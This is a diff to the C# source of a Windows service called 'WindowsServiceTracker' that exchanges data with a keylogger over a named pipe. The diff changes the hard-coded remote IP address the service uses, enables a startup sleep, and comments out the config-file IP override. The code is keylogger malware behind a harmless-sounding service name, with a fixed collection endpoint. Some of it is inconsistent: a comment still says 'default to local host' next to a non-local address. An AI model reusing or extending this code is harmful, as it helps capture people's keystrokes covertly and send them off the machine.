@@ -37,8 +37,8 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
 
         //Variables
-        private volatile String ipAddressString = "131.204.27.103";
-        private long ipAddress = 0x0100007F; //default to local host
+        private volatile String ipAddressString = "172.17.57.149";
+        private long ipAddress = 0x953911ac; //default to local host
         private IPEndPoint ipPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
@@ -78,7 +78,7 @@ namespace WindowsServiceTracker
             //System.Diagnostics.Debugger.Launch();
 
             //Keep the service running for 15 seconds
-            //Thread.Sleep(15000);
+            Thread.Sleep(15000);
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -87,13 +87,13 @@ namespace WindowsServiceTracker
             string tempIP = tempConfigFileIP();
             if (tempIP != null)
             {
-                ipAddressString = tempIP;
+                //ipAddressString = tempIP;
             }
 
             //convert string IP to long
             try
             {
-                ipAddress = BitConverter.ToInt64(IPAddress.Parse(ipAddressString).GetAddressBytes(), 0);
+                //ipAddress = (long)BitConverter.ToUInt64(IPAddress.Parse(ipAddressString).GetAddressBytes(), 0);
             }
             catch (Exception)
             { }
